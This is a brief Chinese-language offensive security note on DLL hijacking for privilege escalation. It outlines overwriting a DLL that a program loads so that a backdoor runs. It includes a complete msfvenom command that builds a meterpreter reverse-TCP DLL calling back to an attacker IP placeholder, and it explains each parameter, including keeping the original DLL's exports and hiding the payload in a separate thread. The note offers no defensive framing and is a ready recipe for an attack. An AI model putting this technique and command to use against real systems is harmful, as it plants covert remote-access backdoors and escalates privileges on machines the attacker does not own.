# DLL劫持提权
1.在掌握的权限中,知道有哪些可执行程序
2.分析如何调用的dll
3.对dll进行覆盖
4.执行后则会调用后门dll

工具:
火绒剑查看程序执行情况
msf可生成后门dll

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<攻击者IP> LPORT=<端口> -x 原始DLL路径 -k -f dll -o malicious.dll

参数解释：

-p windows/meterpreter/reverse_tcp: 指定使用的payload（反向TCP连接）。
LHOST和LPORT: 设置攻击者的IP和监听端口。
-x 原始DLL路径: 指定原始DLL作为模板，保留其导出函数。
-k: 在独立线程中运行payload，避免干扰原始DLL功能。
-f dll: 输出格式为DLL。
-o malicious.dll: 输出的恶意DLL文件名。
```